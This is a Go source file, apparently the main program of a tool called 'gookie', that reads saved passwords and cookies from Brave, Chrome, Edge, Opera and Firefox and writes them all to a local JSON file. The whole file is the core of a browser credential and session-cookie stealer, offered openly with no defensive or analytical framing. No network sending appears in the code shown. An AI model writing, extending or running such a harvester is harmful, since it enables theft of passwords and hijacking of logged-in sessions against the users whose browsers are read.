package main

import (
	"gookie/pkg/browser"
	"gookie/pkg/utils"
)

type JSONStruct struct {
	BravePasswords  []browser.Password `json:"bravePasswords"`
	BraveCookies    []browser.Cookie   `json:"braveCookies"`
	ChromePasswords []browser.Password `json:"chromePasswords"`
	ChromeCookies   []browser.Cookie   `json:"chromeCookies"`
	OperaCookies    []browser.Cookie   `json:"operaCookies"`
	EdgePasswords   []browser.Password `json:"edgePasswords"`
	EdgeCookies     []browser.Cookie   `json:"edgeCookies"`
	FirefoxCookies  []browser.Cookie   `json:"firefoxCookies"`
}

func main() {
	bravePasswords, err := browser.ReadBravePasswords()
	if err != nil {
		panic(err)
	}

	braveCookies, err := browser.ReadBraveCookies()
	if err != nil {
		panic(err)
	}

	chromePasswords, err := browser.ReadChromePasswords()
	if err != nil {
		panic(err)
	}

	chromeCookies, err := browser.ReadChromeCookies()
	if err != nil {
		panic(err)
	}

	operaCookies, err := browser.ReadOperaCookies()
	if err != nil {
		panic(err)
	}

	edgePasswords, err := browser.ReadEdgePasswords()
	if err != nil {
		panic(err)
	}

	edgeCookies, err := browser.ReadEdgeCookies()
	if err != nil {
		panic(err)
	}

	firefoxCookies, err := browser.ReadFirefoxCookies()
	if err != nil {
		panic(err)
	}

	consolidated := JSONStruct{
		BravePasswords:  bravePasswords,
		BraveCookies:    braveCookies,
		ChromePasswords: chromePasswords,
		ChromeCookies:   chromeCookies,
		EdgePasswords:   edgePasswords,
		EdgeCookies:     edgeCookies,
		FirefoxCookies:  firefoxCookies,
		OperaCookies:    operaCookies,
	}

	err = utils.JSONSaver(consolidated, "asdf.json")
	if err != nil {
		panic(err)
	}
}
